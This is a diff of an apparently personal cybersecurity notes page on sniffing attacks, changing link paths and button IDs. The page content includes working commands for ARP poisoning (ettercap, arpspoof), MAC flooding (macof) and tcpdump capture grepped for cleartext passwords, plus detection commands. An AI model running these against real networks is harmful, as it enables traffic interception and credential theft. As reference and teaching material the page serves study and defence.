@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:37 -->
+<!-- 2026-07-20 Mon 15:54 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Sniffing Attack</title>
@@ -892,11 +892,11 @@ techniques are needed to redirect traffic through the attacker.
 </p>
 
 <p>
-Related: <a href="../org/20260213T072232--arp-poisoning__cybersecurity_technique.html">ARP Poisoning</a>
-         <a href="../org/20260314T005733--man-in-the-middle-attack__concept_cybersecurity_technique.html">Man-in-the-Middle Attack</a>
-         <a href="../org/20260213T071400--wireshark__cybersecurity_tool.html">Wireshark</a>
-         <a href="../org/20260213T104035--network-traffic-analysis__concept_cybersecurity.html">Network Traffic Analysis</a>
-         <a href="../org/20260214T083523--switch__networking.html">Switch</a>
+Related: <a href="20260213T072232--arp-poisoning__cybersecurity_technique.html">ARP Poisoning</a>
+         <a href="20260314T005733--man-in-the-middle-attack__concept_cybersecurity_technique.html">Man-in-the-Middle Attack</a>
+         <a href="20260213T071400--wireshark__cybersecurity_tool.html">Wireshark</a>
+         <a href="20260213T104035--network-traffic-analysis__concept_cybersecurity.html">Network Traffic Analysis</a>
+         <a href="20260214T083523--switch__networking.html">Switch</a>
 </p>
 <div id="outline-container-org0891725" class="outline-2">
 <h2 id="org0891725">Passive vs Active</h2>
@@ -956,15 +956,15 @@ Related: <a href="../org/20260213T072232--arp-poisoning__cybersecurity_technique
 <p>
 Sends forged ARP replies associating the attacker's MAC with
 the gateway's IP. Traffic from victims intended for the gateway
-flows through the attacker instead. See <a href="../org/20260213T072232--arp-poisoning__cybersecurity_technique.html">ARP Poisoning</a>.
+flows through the attacker instead. See <a href="20260213T072232--arp-poisoning__cybersecurity_technique.html">ARP Poisoning</a>.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0d175229d67a467aad1a3ae5316dad13>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_bdbbf0e3707e4ce398869de201789cd3>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_0d175229d67a467aad1a3ae5316dad13=document.querySelector('button[name=btn_0d175229d67a467aad1a3ae5316dad13]');
-copyBtnbtn_0d175229d67a467aad1a3ae5316dad13.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Ettercap — ARP poisoning between victim and gateway\nettercap -T -M arp:remote /$VICTIM_IP// /$GATEWAY_IP//\n\n# arpspoof (dsniff package)\necho 1 > /proc/sys/net/ipv4/ip_forward   # enable forwarding\narpspoof -i eth0 -t $VICTIM_IP $GATEWAY_IP\narpspoof -i eth0 -t $GATEWAY_IP $VICTIM_IP\n`);copyBtnbtn_0d175229d67a467aad1a3ae5316dad13.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0d175229d67a467aad1a3ae5316dad13.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_bdbbf0e3707e4ce398869de201789cd3=document.querySelector('button[name=btn_bdbbf0e3707e4ce398869de201789cd3]');
+copyBtnbtn_bdbbf0e3707e4ce398869de201789cd3.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Ettercap — ARP poisoning between victim and gateway\nettercap -T -M arp:remote /$VICTIM_IP// /$GATEWAY_IP//\n\n# arpspoof (dsniff package)\necho 1 > /proc/sys/net/ipv4/ip_forward   # enable forwarding\narpspoof -i eth0 -t $VICTIM_IP $GATEWAY_IP\narpspoof -i eth0 -t $GATEWAY_IP $VICTIM_IP\n`);copyBtnbtn_bdbbf0e3707e4ce398869de201789cd3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_bdbbf0e3707e4ce398869de201789cd3.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -985,15 +985,15 @@ arpspoof -i eth0 -t $<span style="color: var(--clr-variable); background-color: 
 <p>
 Floods the switch CAM table with random MAC addresses until it
 overflows. The switch degrades to hub behaviour — broadcasting
-all traffic to all ports. See <a href="../org/20260214T083523--switch__networking.html">Switch</a> for CAM table detail.
+all traffic to all ports. See <a href="20260214T083523--switch__networking.html">Switch</a> for CAM table detail.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_04a883f8070445d785467e3212a2ea4c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d08a0a784a4d4e40b031881a669286fa>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_04a883f8070445d785467e3212a2ea4c=document.querySelector('button[name=btn_04a883f8070445d785467e3212a2ea4c]');
-copyBtnbtn_04a883f8070445d785467e3212a2ea4c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# macof (dsniff package)\nmacof -i eth0\n`);copyBtnbtn_04a883f8070445d785467e3212a2ea4c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_04a883f8070445d785467e3212a2ea4c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_d08a0a784a4d4e40b031881a669286fa=document.querySelector('button[name=btn_d08a0a784a4d4e40b031881a669286fa]');
+copyBtnbtn_d08a0a784a4d4e40b031881a669286fa.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# macof (dsniff package)\nmacof -i eth0\n`);copyBtnbtn_d08a0a784a4d4e40b031881a669286fa.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d08a0a784a4d4e40b031881a669286fa.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1018,11 +1018,11 @@ poisoning — intercept DNS queries and reply with false records.
 <h2 id="orgee2377e">Capture Tools</h2>
 <div class="outline-text-2" id="text-orgee2377e">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e0ef23dc8b274dd197cedb76b11c7cc7>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_5e04b0fa13db4d5287ad0f92da645e35>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e0ef23dc8b274dd197cedb76b11c7cc7=document.querySelector('button[name=btn_e0ef23dc8b274dd197cedb76b11c7cc7]');
-copyBtnbtn_e0ef23dc8b274dd197cedb76b11c7cc7.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Wireshark — GUI capture and analysis\n# Set interface to promiscuous mode in capture settings\n\n# tcpdump — command line\ntcpdump -i eth0                          # capture all traffic\ntcpdump -i eth0 -w capture.pcap          # write to file\ntcpdump -i eth0 host 192.168.1.10        # filter by host\ntcpdump -i eth0 port 80                  # filter by port\ntcpdump -i eth0 not port 22              # exclude SSH\n\n# Read a capture file\ntcpdump -r capture.pcap\ntcpdump -r capture.pcap -A | grep -i password   # look for cleartext creds\n`);copyBtnbtn_e0ef23dc8b274dd197cedb76b11c7cc7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e0ef23dc8b274dd197cedb76b11c7cc7.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_5e04b0fa13db4d5287ad0f92da645e35=document.querySelector('button[name=btn_5e04b0fa13db4d5287ad0f92da645e35]');
+copyBtnbtn_5e04b0fa13db4d5287ad0f92da645e35.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Wireshark — GUI capture and analysis\n# Set interface to promiscuous mode in capture settings\n\n# tcpdump — command line\ntcpdump -i eth0                          # capture all traffic\ntcpdump -i eth0 -w capture.pcap          # write to file\ntcpdump -i eth0 host 192.168.1.10        # filter by host\ntcpdump -i eth0 port 80                  # filter by port\ntcpdump -i eth0 not port 22              # exclude SSH\n\n# Read a capture file\ntcpdump -r capture.pcap\ntcpdump -r capture.pcap -A | grep -i password   # look for cleartext creds\n`);copyBtnbtn_5e04b0fa13db4d5287ad0f92da645e35.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5e04b0fa13db4d5287ad0f92da645e35.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1051,11 +1051,11 @@ On an unencrypted network, sniffing can recover:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_996835bcf9564361a2eadea651cdf4b6>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_e51239f408fc4ed587db9ceb1d34d00a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_996835bcf9564361a2eadea651cdf4b6=document.querySelector('button[name=btn_996835bcf9564361a2eadea651cdf4b6]');
-copyBtnbtn_996835bcf9564361a2eadea651cdf4b6.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`— HTTP credentials (POST bodies, Basic Auth headers)\n— FTP/Telnet/POP3 credentials (cleartext protocols)\n— Email contents over unencrypted SMTP/IMAP\n— Session cookies (allowing session hijacking)\n— DNS queries (reveals browsing activity even over HTTPS)\n— NTLM hashes over SMB (crackable or relay attack)\n— Kerberos tickets\n`);copyBtnbtn_996835bcf9564361a2eadea651cdf4b6.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_996835bcf9564361a2eadea651cdf4b6.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_e51239f408fc4ed587db9ceb1d34d00a=document.querySelector('button[name=btn_e51239f408fc4ed587db9ceb1d34d00a]');
+copyBtnbtn_e51239f408fc4ed587db9ceb1d34d00a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`— HTTP credentials (POST bodies, Basic Auth headers)\n— FTP/Telnet/POP3 credentials (cleartext protocols)\n— Email contents over unencrypted SMTP/IMAP\n— Session cookies (allowing session hijacking)\n— DNS queries (reveals browsing activity even over HTTPS)\n— NTLM hashes over SMB (crackable or relay attack)\n— Kerberos tickets\n`);copyBtnbtn_e51239f408fc4ed587db9ceb1d34d00a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e51239f408fc4ed587db9ceb1d34d00a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1074,11 +1074,11 @@ let res = copyTextToClipboard(`— HTTP credentials (POST bodies, Basic Auth hea
 <h2 id="orgd831067">Detection</h2>
 <div class="outline-text-2" id="text-orgd831067">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d9d06b278ed9401181320bc9ed813891>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d4a4140c52c4404ba4df821556a2e9ea>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_d9d06b278ed9401181320bc9ed813891=document.querySelector('button[name=btn_d9d06b278ed9401181320bc9ed813891]');
-copyBtnbtn_d9d06b278ed9401181320bc9ed813891.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Detect hosts in promiscuous mode (sends gratuitous ARP)\nnmap --script sniffer-detect $SUBNET\n\n# Detect ARP poisoning\narp -a                           # check ARP table for duplicate MACs\narping $GATEWAY_IP               # compare responses\n\n# Wireshark — detect duplicate IPs\n# Filter: arp.duplicate-address-detected\n`);copyBtnbtn_d9d06b278ed9401181320bc9ed813891.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d9d06b278ed9401181320bc9ed813891.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_d4a4140c52c4404ba4df821556a2e9ea=document.querySelector('button[name=btn_d4a4140c52c4404ba4df821556a2e9ea]');
+copyBtnbtn_d4a4140c52c4404ba4df821556a2e9ea.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Detect hosts in promiscuous mode (sends gratuitous ARP)\nnmap --script sniffer-detect $SUBNET\n\n# Detect ARP poisoning\narp -a                           # check ARP table for duplicate MACs\narping $GATEWAY_IP               # compare responses\n\n# Wireshark — detect duplicate IPs\n# Filter: arp.duplicate-address-detected\n`);copyBtnbtn_d4a4140c52c4404ba4df821556a2e9ea.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d4a4140c52c4404ba4df821556a2e9ea.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
